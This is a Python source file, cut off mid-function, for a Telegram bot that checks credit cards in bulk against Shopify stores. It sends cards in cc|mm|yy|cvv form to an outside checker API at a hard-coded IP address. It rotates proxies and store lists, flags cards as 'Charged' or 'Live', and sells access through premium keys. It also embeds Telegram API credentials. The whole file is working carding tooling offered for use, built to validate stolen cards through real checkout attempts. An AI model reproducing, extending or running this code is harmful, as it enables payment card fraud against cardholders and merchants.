#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AngelGuardian Shopiiiii Bot v3
Full featured Telegram bot for CC checking via Shopify
Supports: Premium keys, proxy management, site management, group approval
"""
from telethon import TelegramClient, events, Button
import asyncio, aiohttp, aiofiles, os, random, time, json, re, sys
from datetime import datetime
from urllib.parse import quote

# ========== CONFIG ==========
CHECKER_API_URL = 'http://62.72.29.89:8081'
API_ID = 21124241
API_HASH = 'b7ddce3d3683f54be788fddae73fa468'
BOT_TOKEN = '8078746989:***'
ADMIN_IDS = [7603003996]
OWNER_ID = 7603003996

# Force Join — users must join these before using the bot
FORCE_CHANNEL = '@NSEFXX'                  # Channel username
FORCE_GROUP = '-1004305447869'              # Group ID
FORCE_CHANNEL_LINK = 'https://t.me/NSEFXX'
FORCE_GROUP_LINK = 'https://t.me/+I83uWcfbknM5OGQ9'

# File paths
PREMIUM_FILE = 'premium.txt'
SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'
KEYS_FILE = 'keys.txt'
GROUPS_FILE = 'groups.txt'

# Fallback store
FALLBACK_SITE = 'https://fxdesigns-8213.myshopify.com'

# ========== PREMIUM CUSTOM EMOJIS ==========
PREMIUM_EMOJI_IDS = {
    "✅": "6023660820544623088", "🔥": "5999340396432333728",
    "❌": "6037570896766438989", "⚡": "6026367225466720832",
    "💳": "5971944878815317190", "💠": "5971837723676249096",
    "🌐": "6026367225466720832", "🎯": "5974235702701853774",
    "🤖": "6057466460886799210", "🤵": "4949560993840629085",
    "💰": "5971944878815317190", "⏸️": "6001440193058444284",
    "▶️": "6285315214673975495", "🛑": "5420323339723881652",
    "📊": "5971837723676249096", "📦": "6066395745139824604",
    "📋": "5974235702701853774", "🔄": "5971837723676249096",
    "🚀": "6282977077427702833", "⚠️": "5420323339723881652",
    "🛡️": "5999340396432333728", "💫": "5971944878815317190",
    "✨": "6023660820544623088", "🎉": "6282977077427702833",
    "🔔": "6023660820544623088", "💡": "5999340396432333728",
    "📌": "6066395745139824604", "🃏": "5974235702701853774",
    "📂": "5971837723676249096", "🔀": "6285315214673975495",
    "➕": "6023660820544623088", "🔍": "6026367225466720832",
    "🗑️": "6037570896766438989", "🔢": "6066395745139824604",
    "🧹": "5971944878815317190", "📡": "4949560993840629085",
    "🔑": "5999340396432333728", "👑": "6282977077427702833",
    "😡": "5999340396432333728", "🫆": "6023660820544623088",
    "🤷": "6057466460886799210", "💀": "6037570896766438989",
    "📝": "6023660820544623088", "⏳": "5971837723676249096",
    "💎": "6023660820544623088",
}

def premium_emoji(text):
    """Replace emojis with Telegram premium custom emojis (<tg-emoji> tags)"""
    if not text:
        return text
    placeholders = []
    result = text
    for i, (emoji, doc_id) in enumerate(PREMIUM_EMOJI_IDS.items()):
        placeholder = f"\x00PE{i:02d}\x00"
        placeholders.append((placeholder, doc_id, emoji))
        result = result.replace(emoji, placeholder)
    for placeholder, doc_id, emoji in placeholders:
        result = result.replace(placeholder, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return result

# ========== ACCESS CONTROL ==========
def is_admin(user_id):
    return user_id in ADMIN_IDS

def is_owner(user_id):
    return user_id == OWNER_ID

def is_premium(user_id):
    """Check if user is in premium.txt"""
    try:
        with open(PREMIUM_FILE, 'r') as f:
            return str(user_id) in f.read().split('\n')
    except:
        return False

# ========== FORCE JOIN CHECK ==========
async def check_force_join(uid):
    """Returns True if user has joined both channel and group"""
    try:
        ch = await bot.get_entity(FORCE_CHANNEL)
        try: await bot.get_permissions(ch, uid)
        except: return False
    except: pass
    try:
        grp = await bot.get_entity(int(FORCE_GROUP))
        try: await bot.get_permissions(grp, uid)
        except: return False
    except: pass
    return True

async def send_force_join(event):
    """Send force join lock screen with buttons"""
    buttons = [
        [Button.url("1️⃣ Join Channel", FORCE_CHANNEL_LINK)],
        [Button.url("2️⃣ Join Group", FORCE_GROUP_LINK)],
        [Button.inline("✅ I Joined — Verify", b"verify_join")]
    ]
    msg = f"""<b>🔒 𝗔𝗰𝗰𝗲𝘀𝘀 𝗟𝗼𝗰𝗸𝗲𝗱</b>
<b>━━━━━━━━━━━━━━━</b>
You must join both our channel & group to use this bot.

<b>━━━━━━━━━━━━━━━</b>
⚡ NS CHECKER"""
    await event.reply(premium_emoji(msg), buttons=buttons, parse_mode='html')

# ========== GROUP FUNCTIONS ==========
def load_groups():
    if not os.path.exists(GROUPS_FILE):
        with open(GROUPS_FILE, 'w') as f:
            f.write("-1004305447869\n")
    with open(GROUPS_FILE, 'r') as f:
        return [l.strip() for l in f if l.strip()]

def is_allowed_group(chat_id):
    return str(chat_id) in load_groups()

def add_group(gid):
    groups = load_groups()
    gid = str(gid)
    if gid not in groups:
        with open(GROUPS_FILE, 'a') as f:
            f.write(f"{gid}\n")
        return True
    return False

# ========== FILE HELPERS ==========
def get_file_lines(fp):
    if not os.path.exists(fp): return []
    with open(fp, 'r') as f:
        return [l.strip() for l in f if l.strip()]

def load_premium_users():
    return get_file_lines(PREMIUM_FILE)

def load_sites():
    return get_file_lines(SITES_FILE)

def load_proxies():
    return get_file_lines(PROXY_FILE)

# ========== KEY SYSTEM ==========
def load_keys():
    keys = {}
    if not os.path.exists(KEYS_FILE): return keys
    with open(KEYS_FILE, 'r') as f:
        for l in f:
            if ':' in l:
                k, v = l.strip().split(':', 1)
                keys[k] = v
    return keys

def save_key(key, user_id='unused'):
    with open(KEYS_FILE, 'a') as f:
        f.write(f"{key}:{user_id}\n")

def generate_key():
    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    return f"nschk-{''.join(random.choices(chars, k=15))}"

def redeem_key(key, uid):
    keys = load_keys()
    if key not in keys: return False, 'Invalid key'
    if keys[key] != 'unused': return False, 'Key already used'
    with open(KEYS_FILE, 'r') as f: lines = f.readlines()
    with open(KEYS_FILE, 'w') as f:
        for l in lines:
            if l.startswith(key + ':'):
                f.write(f"{key}:{uid}\n")
            else:
                f.write(l)
    with open(PREMIUM_FILE, 'a') as f:
        f.write(f"{uid}\n")
    return True, 'Success'

# ========== HELPERS ==========
def extract_cc(text):
    """Extract CC numbers from text: cc|mm|yy|cvv format"""
    pattern = r'(\d{13,19})\|(\d{2})\|(?:20)?(\d{2})\|(\d{3,4})'
    return re.findall(pattern, text)

DEAD_INDICATORS = (
    'timeout', 'unreachable', 'connection reset', 'connection failed',
    'name or service not known', 'ssl error', 'tunnel', 'empty reply',
    'bad gateway', 'service unavailable', 'network error',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'no product', 'error_site_down',
    'error_amount_too_high', 'all products above',
    'could not resolve', 'domain name not found',
    'access denied', 'cloudflare', 'http 404',
    'url rejected', 'malformed input',
)

def is_dead_site_error(msg):
    msg = msg.lower()
    return any(k in msg for k in DEAD_INDICATORS)

# Initialize bot
bot = TelegramClient('shopii_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
active_sessions = {}

# ========== VERIFY JOIN CALLBACK ==========
@bot.on(events.CallbackQuery(data=b"verify_join"))
async def verify_join(event):
    uid = event.sender_id
    if await check_force_join(uid):
        await event.answer(premium_emoji("✅ Verified! You can now use the bot."), alert=True)
        await event.delete()
    else:
        await event.answer(premium_emoji("❌ You haven't joined both yet!"), alert=True)

# ========== BIN INFO ==========
BIN_DB = {
    '4': ('VISA', 'CREDIT', 'CLASSIC', 'Sample Bank', 'US'),
    '5': ('MASTERCARD', 'CREDIT', 'STANDARD', 'Sample Bank', 'US'),
    '3': ('AMEX', 'CHARGE', 'PLATINUM', 'American Express', 'US'),
    '6': ('DISCOVER', 'CREDIT', 'STANDARD', 'Discover Bank', 'US'),
}

async def get_bin_info(cc):
    try:
        prefix = cc[:1] if cc else '4'
        info = BIN_DB.get(prefix, BIN_DB['4'])
        return {
            'brand': info[0], 'type': info[1], 'level': info[2],
            'bank': info[3], 'country': info[4], 'flag': '🇺🇸'
        }
    except:
        return {'brand': 'Unknown', 'type': 'Unknown', 'level': 'Unknown',
                'bank': 'Unknown', 'country': 'Unknown', 'flag': '🌐'}

# ========== CORE CHECKER ==========
async def check_card(card, site, proxy):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid', 'message': 'Bad format', 'card': card}
        api_url = f"{CHECKER_API_URL}/?{card}&url={site}&proxy={proxy}"
        timeout = aiohttp.ClientTimeout(total=120)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(api_url) as resp:
                raw = await resp.json(content_type=None)
        msg = raw.get('Response', '')
        price = raw.get('Price', '-')
        gate = raw.get('Gate', 'Shopify')
        if is_dead_site_error(msg):
            return {'status': 'Site Error', 'message': msg, 'card': card,
                    'retry': True, 'gateway': gate, 'price': price}
        ml = msg.lower()
        if msg == 'ORDER_PLACED':
            return {'status': 'Charged', 'message': msg, 'card': card,
                    'site': site, 'gateway': gate, 'price': price}
        if msg in ('OTP_REQUIRED', 'INSUFFICIENT_FUNDS'):
            return {'status': 'Approved', 'message': msg, 'card': card,
                    'site': site, 'gateway': gate, 'price': price}
        if msg == 'CARD_DECLINED':
            return {'status': 'Dead', 'message': msg, 'card': card,
                    'site': site, 'gateway': gate, 'price': price}
        if any(k in ml for k in ['order_placed','charged','thank you']):
            return {'status': 'Charged', 'message': msg, 'card': card,
                    'site': site, 'gateway': gate, 'price': price}
        elif any(k in ml for k in ['otp_required','insufficient_funds','approved']):
            return {'status': 'Approved', 'message': msg, 'card': card,
                    'site': site, 'gateway': gate, 'price': price}
        return {'status': 'Dead', 'message': msg, 'card': card,
                'site': site, 'gateway': gate, 'price': price}
    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'Timeout', 'card': card, 'retry': True}
    except Exception as e:
        em = str(e)
        if is_dead_site_error(em):
            return {'status': 'Site Error', 'message': em, 'card': card, 'retry': True}
        return {'status': 'Dead', 'message': em, 'card': card,
                'gateway': 'Unknown', 'price': '-'}

async def check_card_with_retry(card, sites, proxies, max_retries=5):
    last = None
    if not sites: sites = [FALLBACK_SITE]
    if not proxies: proxies = ['']
    tried_sites = []
    expensive_count = 0
    for attempt in range(max_retries):
        if expensive_count > 10:
            return {'status': 'Dead', 'message': 'All expensive', 'card': card,
                    'gateway': 'Unknown', 'price': '-'}
        avail = [s for s in sites if s not in tried_sites]
        if not avail:
            avail = sites; tried_sites = []
        site = random.choice(avail)
        tried_sites.append(site)
        proxy = random.choice(proxies)
        result = await check_card(card, site, proxy)
        msg = result.get('message', '').lower()
        if any(k in msg for k in ['error_amount_too_high', 'error_site_down', 'no product']):
            expensive_count += 1
            if site in sites: sites.remove(site)
            continue
        if not result.get('retry'):
            return result
        last = result
        await asyncio.sleep(0.3)
    if last:
        return {'status': 'Dead', 'message': last['message'], 'card': card,
                'gateway': last.get('gateway', 'Unknown'),
                'price': last.get('price', '-'), 'site': 'Multiple'}
    result = await check_card(card, FALLBACK_SITE, '')
    if result.get('status') in ['Charged', 'Approved']:
        return result
    return {'status': 'Dead', 'message': result.get('message', 'Max retries'),
            'card': card, 'gateway': result.get('gateway', 'Unknown'),
            'price': result.get('price', '-'), 'site': FALLBACK_SITE}

# ========== SITE/PROXY TESTING ==========
async def test_site(site, proxy):
    for p in [proxy, '']:
        try:
            r = await check_card("5154623245618097|03|2032|156", site, p)
            if not r.get('retry') and 'error' not in str(r.get('message','')).lower():
                return {'site': site, 'status': 'alive'}
        except: pass
    return {'site': site, 'status': 'dead'}

async def test_proxy(proxy):
    try:
        r = await check_card("5154623245618097|03|2032|156", "https://fxdesigns-8213.myshopify.com", proxy)
        return {'proxy': proxy, 'status': 'alive'}
    except:
        return {'proxy': proxy, 'status': 'dead'}

# ========== NOTIFICATIONS ==========
async def send_hit(uid, result, hit_type, username):
    em = '✅' if hit_type == 'Charged' else '🔥'
    st = '𝐂𝐡𝐚𝐫𝐠𝐞𝐝' if hit_type == 'Charged' else '𝐋𝐢𝐯𝐞'
    binfo = await get_bin_info(result.get('card', ''))
    msg = f"""<b>⚡💳 ㅤ#𝙉𝙎𝙀𝙁𝙓𝙓  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐇𝐢𝐭 𝐅𝐨𝐮𝐧𝐝!</b>
<blockquote>{em} Status: {st}</blockquote>
<blockquote>💳 Card: <code>{result.get('card','')}</code></blockquote>
<blockquote>📝 Response: {result.get('message','')[:150]}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {result.get('gateway','Unknown')} | 💰 {result.get('price','-')}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨</b>
<pre>𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {binfo['brand']} - {binfo['type']} - {binfo['level']}
𝗕𝗮𝗻𝗸: {binfo['bank']}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {binfo['country']} {binfo['flag']}</pre>
<b>━━━━━━━━━━━━━━━━━</b>
🤖 <b>Bot By: <a href="tg://user?id=7603003996">ㅤ Nahid Hossen</a></b>"""
    try: await bot.send_message(uid, premium_emoji(msg), parse_mode='html')
    except: pass

async def update_progress(uid, mid, results, count):
    elapsed = int(time.time() - results['start_time'])
    h, m, s = elapsed//3600, (elapsed%3600)//60, elapsed%60
    gw = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'Unknown')
    txt = f"""<b>⚡💳 ㅤ#𝙉𝙎𝙀𝙁𝙓𝙓  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬</b>
<blockquote>💳 Total: {results['total']} | ✅ Charged: {len(results['charged'])} | 🔥 Live: {len(results['approved'])} | ❌ Dead: {len(results['dead'])}</blockquote>
<blockquote>📊 Checked: {count}/{results['total']}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gw}</blockquote>
<blockquote>⏱️ Time: {h}h {m}m {s}s</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>"""
    buttons = [[Button.inline("⏸️ Pause", b"pause"), Button.inline("▶️ Resume", b"resume")],
               [Button.inline("🛑 Stop", b"stop")]]
    try: await bot.edit_message(uid, mid, premium_emoji(txt), buttons=buttons, parse_mode='html')
    except: pass

async def send_final(uid, results):
    elapsed = int(time.time() - results['start_time'])
    h, m, s = elapsed//3600, (elapsed%3600)//60, elapsed%60
    gw = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'Unknown')
    summary = f"""<b>⚡💳 ㅤ#𝙉𝙎𝙀𝙁𝙓𝙓  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>
<blockquote>💳 Total: {results['total']} | ✅ Charged: {len(results['charged'])} | 🔥 Live: {len(results['approved'])} | ❌ Dead: {len(results['dead'])}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gw}</blockquote>
<blockquote>⏱️ Time: {h}h {m}m {s}s</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 𝐇𝐢𝐭𝐬</b>
<pre>{results['hits_file']}</pre>
<b>━━━━━━━━━━━━━━━━━</b>
🤖 <b>Bot By: <a href="tg://user?id=7603003996">ㅤ Nahid Hossen</a></b>"""
    try: await bot.send_message(uid, premium_emoji(summary), parse_mode='html')
    except: pass

# ========== START COMMAND ==========
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    uid = event.sender_id
    is_prem = is_premium(uid)
    is_adm = is_admin(uid)
    base = (
        "<b>⚡💳 Welcome to NS CHK 💳⚡</b>\n"
        "<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
        "<b>💠 𝐔𝐬𝐞𝐫 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>\n"
        "<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        "🃏 /sh CC|MM|YY|CVV — Check single card\n"
        "📂 /msh — Mass check cards (.txt file)\n"
        "🌐 /siteran — Test & remove dead sites\n"
        "🔀 /proxy — Test & remove dead proxies\n"
        "➕ /addproxy — Add proxies (one per line)\n"
        "🔍 /chkproxy — Check single proxy\n"
        "🗑️ /rmproxy — Remove single proxy\n"
        "🔢 /rmproxyindex 1,2,3 — Remove by index\n"
        "🧹 /clearproxy — Remove ALL proxies\n"
        "📋 /getproxy — View all proxies\n"
        "📡 /ping — Check checker API status\n"
        "🔑 /redeem nschk-xxx — Activate premium key\n"
    )
    if is_adm:
        base += (
            "\n"
            "<b>💠 𝐀𝐝𝐦𝐢𝐧 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>\n"
            "<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n"
            "👑 /genkey [count] [days] — Generate keys\n"
            "👑 /addadmin USER_ID — Add admin\n"
            "👑 /adminlist — View admins\n"
            "👑 /addgc GROUP_ID — Approve group\n"
            "👑 /rm SITE_URL — Remove site\n"
            "👑 /restart — Restart bot\n"
        )
    base += "<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n"
    base += "<b>⚠️ Only premium users can use this bot.</b>" if not is_prem else "<b>✅ You have premium access. Enjoy!</b>"
    await event.reply(premium_emoji(base), parse_mode='html')

# ========== SINGLE CC CHECK /sh ==========
@bot.on(events.NewMessage(pattern=r'^/sh$'))
async def sh_noargs(event):
    if not is_premium(event.sender_id):
        await send_force_join(event)
        return
    await event.reply(premium_emoji(
        "<b>⚡ 𝗡𝗼 𝗖𝗖 𝗳𝗼𝘂𝗻𝗱!</b>\n\n"
        "<b>⚡ 𝗨𝘀𝗮𝗴𝗲:</b> <code>/sh 4388540109154632|03|2030|815</code>\n"
        "<b>⚡ 𝗢𝗿 𝗿𝗲𝗽𝗹𝘆 𝘁𝗼 𝗮 𝗺𝗲𝘀𝘀𝗮𝗴𝗲 𝗰𝗼𝗻𝘁𝗮𝗶𝗻𝗶𝗻𝗴 𝗮 𝗖𝗖.</b>"
    ), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/sh\s+'))
async def sh_check(event):
    uid = event.sender_id
    if not is_premium(uid):
        await send_force_join(event)
        return
    sites = load_sites()
    proxies = load_proxies()
    if not sites:
        await event.reply(premium_emoji("❌ No sites available."), parse_mode='html'); return
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available."), parse_mode='html'); return
    cc_input = event.message.text.split(' ', 1)[1].strip()
    cards = extract_cc(cc_input)
    if not cards:
        await event.reply(premium_emoji("<b>⚡ 𝗡𝗼 𝗖𝗖 𝗳𝗼𝘂𝗻𝗱!</b>\n\n<b>⚡ 𝗨𝘀𝗮𝗴𝗲:</b> <code>/sh 4388540109154632|03|2030|815</code>"), parse_mode='html')
        return
    card = cards[0]
    sm = await event.reply(premium_emoji(
        f"<b>⚡💳 ㅤ#𝙉𝙎𝙀𝙁𝙓𝙓  💳⚡</b>\n<b>━━━━━━━━━━━━━━━━━</b>\n<b>⚡💠 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠...</b>\n<blockquote>💳 Card: <code>{card[0]}|{card[1]}|{card[2]}|{card[3]}</code></blockquote>\n<b>━━━━━━━━━━━━━━━━━</b>"
    ), parse_mode='html')
    try:
        result = await check_card_with_retry(f"{card[0]}|{card[1]}|{card[2]}|{card[3]}", sites, proxies, 3)
        st = result['status']
        em, status_text = ('✅', '𝐂𝐡𝐚𝐫𝐠𝐞𝐝') if st == 'Charged' else ('🔥', '𝐋𝐢𝐯𝐞') if st == 'Approved' else ('❌', '𝐃𝐞𝐚𝐝')
        binfo = await get_bin_info(card[0])
        resp = f"""<b>⚡💳 ㅤ#𝙉𝙎𝙀𝙁𝙓𝙓  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>
<blockquote>{em} Status: {status_text}</blockquote>
<blockquote>💳 Card: <code>{card[0]}|{card[1]}|{card[2]}|{card[3]}</code></blockquote>
<blockquote>📝 Response: {result.get('message','')[:150]}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {result.get('gateway','Unknown')} | 💰 {result.get('price','-')}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨</b>
<pre>𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {binfo['brand']} - {binfo['type']} - {binfo['level']}
𝗕𝗮𝗻𝗸: {binfo['bank']}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {binfo['country']} {binfo['flag']}</pre>
<b>━━━━━━━━━━━━━━━━━</b>
🤖 <b>Bot By: <a href="tg://user?id=7603003996">ㅤ Nahid Hossen</a></b>"""
        await sm.edit(premium_emoji(resp), parse_mode='html')
    except Exception as e:
        await sm.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

# ========== PROXY COMMANDS ==========
@bot.on(events.NewMessage(pattern=r'^/chkproxy\s+'))
async def chkproxy(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(premium_emoji("<b>⚡ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱!</b>"), parse_mode='html'); return
    args = event.message.text.split(' ', 1)
    if len(args) < 2:
        await event.reply(premium_emoji("⚡ Usage: <code>/chkproxy host:port:user:pass</code>"), parse_mode='html'); return
    p = args[1].strip()
    msg = await event.reply(premium_emoji(f"🔄 Checking proxy..."))
    try:
        r = await test_proxy(p)
        if r['status'] == 'alive':
            await msg.edit(premium_emoji(f"✅ Proxy Alive: <code>{p}</code>"), parse_mode='html')
        else:
            await msg.edit(premium_emoji(f"❌ Proxy Dead: <code>{p}</code>"), parse_mode='html')
    except Exception as e:
        await msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rmproxy\s+'))
async def rmproxy(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(premium_emoji("<b>⚡ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱!</b>"), parse_mode='html'); return
    args = event.message.text.split(' ', 1)
    if len(args) < 2:
        await event.reply(premium_emoji("⚡ Usage: <code>/rmproxy host:port:user:pass</code>"), parse_mode='html'); return
    target = args[1].strip()
    proxies = [p for p in load_proxies() if p != target]
    with open(PROXY_FILE, 'w') as f:
        f.write("\n".join(proxies))
    await event.reply(premium_emoji(f"✅ Removed: <code>{target}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rmproxyindex\s+'))
async def rmproxyindex(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(premium_emoji("<b>⚡ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱!</b>"), parse_mode='html'); return
    args = event.message.text.split(' ', 1)
    if len(args) < 2:
        await event.reply(premium_emoji("⚡ Usage: <code>/rmproxyindex 1,2,3</code>"), parse_mode='html'); return
    try:
        idxs = [int(i.strip()) for i in args[1].split(',')]
        proxies = load_proxies()
        removed = []
        for idx in sorted(idxs, reverse=True):
            if 0 <= idx-1 < len(proxies):
                removed.append(proxies.pop(idx-1))
        with open(PROXY_FILE, 'w') as f:
            f.write("\n".join(proxies))
        await event.reply(premium_emoji(f"✅ Removed {len(removed)} proxies"), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/clearproxy$'))
async def clearproxy(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(premium_emoji("<b>⚡ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱!</b>"), parse_mode='html'); return
    with open(PROXY_FILE, 'w') as f: f.write('')
    await event.reply(premium_emoji("✅ All proxies removed."), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/getproxy$'))
async def getproxy(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(premium_emoji("<b>⚡ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱!</b>"), parse_mode='html'); return
    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("📋 No proxies found."), parse_mode='html'); return
    proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(proxies)])
    await event.reply(premium_emoji(f"<b>📋 Proxies ({len(proxies)}):</b>\n\n{proxy_list}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/addproxy'))
async def addproxy(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(premium_emoji("<b>⚡ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱!</b>"), parse_mode='html'); return

    # Add proxies from message text (one per line)
    text = event.message.text
    # Remove /addproxy prefix
    if text.startswith('/addproxy '):
        text = text[10:]
    elif text.startswith('/addproxy'):
        text = text[9:]

    new_proxies = [p.strip() for p in text.split('\n') if p.strip() and ':' in p]
    if not new_proxies:
        await event.reply(premium_emoji(
            "⚡ <b>Usage:</b> <code>/addproxy</code>\n\n"
            "Paste proxies (one per line) after the command:\n"
            "<code>host:port:user:pass</code>"
        ), parse_mode='html'); return

    existing = load_proxies()
    added = 0
    for p in new_proxies:
        if p not in existing:
            existing.append(p); added += 1
    with open(PROXY_FILE, 'w') as f:
        f.write("\n".join(existing))
    await event.reply(premium_emoji(f"✅ Added {added} new proxy(s). Total: {len(existing)}"), parse_mode='html')

# ========== SITE COMMANDS ==========
@bot.on(events.NewMessage(pattern=r'^/rm$'))
async def rm_noargs(event):
    if not is_admin(event.sender_id):
        await event.reply(premium_emoji("⚡ <b>Admin only!</b>"), parse_mode='html'); return
    await event.reply(premium_emoji("⚡ Usage: <code>/rm https://site.com</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rm\s+'))
async def rm_site(event):
    if not is_admin(event.sender_id):
        await event.reply(premium_emoji("⚡ <b>Admin only!</b>"), parse_mode='html'); return
    args = event.message.text.split(' ', 1)
    if len(args) < 2:
        await event.reply(premium_emoji("⚡ Usage: <code>/rm https://site.com</code>"), parse_mode='html'); return
    target = args[1].strip()
    sites = [s for s in load_sites() if s != target]
    with open(SITES_FILE, 'w') as f:
        f.write("\n".join(sites))
    await event.reply(premium_emoji(f"✅ Removed: {target}"), parse_mode='html')

# ========== MASS CHECK /msh ==========
@bot.on(events.NewMessage(pattern='/msh'))
async def msh(event):
    uid = event.sender_id
    if not is_premium(uid):
        await send_force_join(event)
        return
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji(
            "<b>⚡ Usage:</b>\n\n<b>⚡ Send a .txt file with CCs</b>\n<b>⚡ Reply to the file with /msh</b>\n\n<b>⚡ Format:</b> cc|mm|yy|cvv (one per line)"
        )); return
    reply = await event.get_reply_message()
    if not reply.file or not reply.file.name.endswith('.txt'):
        await event.reply(premium_emoji("<b>⚡ Please send a .txt file with CCs!</b>\n\n<b>⚡ Reply to the file with /msh</b>")); return
    if not load_sites():
        await event.reply(premium_emoji("❌ No sites available."), parse_mode='html'); return
    if not load_proxies():
        await event.reply(premium_emoji("❌ No proxies available."), parse_mode='html'); return
    sm = await event.reply(premium_emoji("🔄 Processing your file..."), parse_mode="html")
    fp = await reply.download_media()
    async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    cards = extract_cc(content)
    if not cards:
        await sm.edit(premium_emoji("😡 No valid cards found in file."), parse_mode="html")
        os.remove(fp); return
    if len(cards) > 5000:
        cards = cards[:5000]
    os.remove(fp)
    total = len(cards)
    await sm.edit(premium_emoji(f"✨ <b>Starting check for {total} cards...</b>\n\n⚡ Status: Running | 💳 Total: {total}"), parse_mode='html')
    sk = f"{uid}_{sm.id}"
    active_sessions[sk] = {'paused': False}
    results = {'start_time': time.time(), 'charged': [], 'approved': [], 'dead': [], 'total': total, 'hits_file': ''}
    hits = []
    idx = 0
    sites = load_sites()[:]
    proxies = load_proxies()[:]
    for i, card in enumerate(cards):
        while sk in active_sessions and active_sessions[sk].get('paused'):
            await asyncio.sleep(1)
        if sk not in active_sessions:
            break
        cstr = f"{card[0]}|{card[1]}|{card[2]}|{card[3]}"
        r = await check_card_with_retry(cstr, sites, proxies, 5)
        st = r['status']
        if st == 'Charged':
            results['charged'].append(r)
            hits.append(f"✅ {cstr} | CHARGED | {r.get('price','-')}")
            await send_hit(uid, r, 'Charged', '')
        elif st == 'Approved':
            results['approved'].append(r)
            hits.append(f"🔥 {cstr} | LIVE | {r.get('price','-')}")
            await send_hit(uid, r, 'Approved', '')
        else:
            results['dead'].append(r)
        idx += 1
        if idx % 10 == 0 or idx == total:
            await update_progress(uid, sm.id, results, idx)
        await asyncio.sleep(0.1)
    results['hits_file'] = '\n'.join(hits) if hits else 'No hits'
    await send_final(uid, results)
    active_sessions.pop(sk, None)

# ========== PROXY CHECK ==========
@bot.on(events.NewMessage(pattern='/proxy'))
async def proxy_check(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(premium_emoji("<b>⚡ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱!</b>"), parse_mode='html'); return
    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available."), parse_mode='html'); return
    sm = await event.reply(premium_emoji(f"🔥 Checking {len(proxies)} proxies in batches of 50..."), parse_mode="html")
    alive, dead = [], []
    bs = 50
